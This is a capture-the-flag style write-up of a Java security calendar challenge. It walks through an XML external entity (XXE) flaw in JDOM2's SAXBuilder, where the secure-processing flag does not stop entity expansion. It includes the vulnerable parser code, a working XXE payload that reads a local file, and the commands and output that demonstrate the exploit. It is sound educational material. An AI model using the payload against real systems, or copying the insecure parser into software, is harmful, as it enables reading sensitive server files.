# RIPS Tech Day 1 - Candy Cane
https://www.ripstech.com/java-security-calendar-2019/

## Solution
XXE is possbile using the `SAXBuilder` class. The developer thinks they are doing it securely by using `sax.setFeature("http://javax.xml.XMLConstants/feature/secure-processing",true);` however is does not disable External Entity Expansion as can be see [here](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md#saxbuilder).

## The Process
In this challenge, we were presented with a code snipped at asked to identify what is wrong.

```java
import org.jdom2.Content;
import org.jdom2.Document;
import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;

public class ImportDocument {
  // This function extracts the text of an OpenOffice document
  public static String extractString() throws IOException, JDOMException {
    File initialFile = new File("uploaded_office_doc.odt");
    InputStream in = new FileInputStream(initialFile);
    final ZipInputStream zis = new ZipInputStream(in);
    ZipEntry entry;
    List<Content> content = null;
    while ((entry = zis.getNextEntry()) != null) {
      if (entry.getName().equals("content.xml")) {
        final SAXBuilder sax = new org.jdom2.input.SAXBuilder();
        sax.setFeature("http://javax.xml.XMLConstants/feature/secure-processing",true);
        Document doc = sax.build(zis);
        content = doc.getContent();
        zis.close();
        break;
      }
    }
    StringBuilder sb = new StringBuilder();
    if (content != null){
      for(Content item : content){
        sb.append(item.getValue());
      }
    }
    return sb.toString();
  }
}
```
### Manual Code Review
Looking at the code, we see it is reading in a file and processing it. Therefore we can deduct that the source of the vulnerability is the input file. Following the code, the input file is a Zip file format. Zip files have known vulnerabilities, one of the newest being [zip-slip](https://snyk.io/research/zip-slip-vulnerability). The trigger this vulnerability, we would need to write out the contents of the zip file, however further down we see this is not the case because the code is just building a string from the zip elements. Another potential here is a [zip bomb](https://en.wikipedia.org/wiki/Zip_bomb). In looking at this code, we see there are no protections against this type of attack which is detailed [here](https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream). However, this is simply a DoS attack and not very exciting. So let the digging continue.

Furtherdown, we see that the code is looking for an XML file in the zip contents. Then then parses the XML file into a `SAXBuilder` object and parses the contents. XML has multiple vulnerabilities which could be affected which OWASP documents [here](https://www.owasp.org/images/5/58/XML_Based_Attacks_-_OWASP.pdf). Looking over the options, we see XML bomb, very similar to zip bomb, multiple injection attacks against web targets and external entity expansion (xxe). Since we are only reading a local file, we will excluce the injection attacks as well as the XML bomb since it is the same as before. This leaves us with xxe. We see the developer invoking secure-processing as a parameter being set in the `SAXBuilder`. Looking at this [option](https://docs.oracle.com/javase/8/docs/api/javax/xml/XMLConstants.html#FEATURE_SECURE_PROCESSING) we see that it only prevents against XML bomb style attacks with no mention of xxe. Probably, xxe is the main vulnerability of interest in this code. To verify statically, we can research how to prevent xxe in `SAXBuilder` and see if there is special code which must be included. Doing some googling, we find that there is infact special parameters which must be set to [prevent](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md#saxbuilder) xxe. We can therefore deduce that the this code is vulnerable to xxe.

### Test Dynamically
With the static analysis, we've identified an issue but to prove what it can do, we must exploit it. In looking at the code, we see we would need to craft a malicious XML document then zip it into the odf file which the code is parsing. This part is easy enough. Locating xxe attack xml is easy enough with google, so we settled on:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT text ANY >
<!ENTITY xxe SYSTEM "file:///tmp/shadow" >]><foo>&xxe;</foo>
```

We set the payload to read from our tmp directory a file shadow. So we should probably populate the file with data.
```bash
echo "shadow file" > /tmp/shadow
```
We can now create the malcious odf file.
```bash
zip uploaded_office_doc.odt content.xml
```

Now all we need to do is to run the code. We discovered however there are some issues with the code with need add such as fixing imports, adding a main and printing out the document to prove we read from /tmp/shadow. In addition, we will need to get the dependencies; downloading the jdom2 jars. The updated source code is included in the repo (ImportDocument.java).

To get the jar files, we can simply download them to the source location:
```bash
wget http://www.jdom.org/dist/binary/jdom-2.0.6.zip

unzip jdom-2.0.6.zip
```

Once unzipped, we can compile the java code to a class file and then run it.
```bash
$ javac  -cp ./jdom-2.0.6.jar ImportDocument.java

$ java -classpath $(pwd):$(pwd)/jdom-2.0.6.jar ImportDocument
Running string extractor
shadow file

```

**We have now successfully exploited the vulnerability!**